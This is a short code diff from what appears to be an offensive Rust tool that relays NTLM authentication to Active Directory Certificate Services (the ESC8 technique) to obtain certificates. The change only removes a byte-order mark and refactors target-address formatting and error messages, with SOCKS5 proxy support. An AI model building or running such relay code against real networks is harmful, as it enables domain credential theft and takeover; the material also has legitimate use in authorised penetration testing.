@@ -1,4 +1,4 @@
-﻿//! ADCS ESC8 Relay — asynchronous NTLM relay to Active Directory Certificate Services.
+//! ADCS ESC8 Relay — asynchronous NTLM relay to Active Directory Certificate Services.
 //!
 //! Listens for inbound HTTP connections on port 80, performs a 3-message NTLM relay
 //! to the target ADCS certsrv endpoint, and then POSTs a CSR on the authenticated
@@ -179,9 +179,10 @@ async fn process_ntlm_relay(
     let ntlm_b64 = strip_ntlm_prefix(negotiate_header);
 
     // -- Connect to ADCS target (direct or via SOCKS5) ------
-    let target_sock: std::net::SocketAddr = format!("{}:80", target_host)
-        .parse()
-        .map_err(|e| RelayError::Config(format!("Invalid ADCS target address: {e}")))?;
+    let target_addr = crate::utils::format_addr(target_host, 80);
+    let target_sock: std::net::SocketAddr = target_addr.parse().map_err(|e| {
+        RelayError::Config(format!("Invalid ADCS target address '{target_addr}': {e}"))
+    })?;
     let mut target = crate::utils::socks5_connect(target_sock, IO_TIMEOUT, socks5_proxy)
         .await
         .map_err(|e| RelayError::Network(format!("ADCS connect failed: {e}")))?;
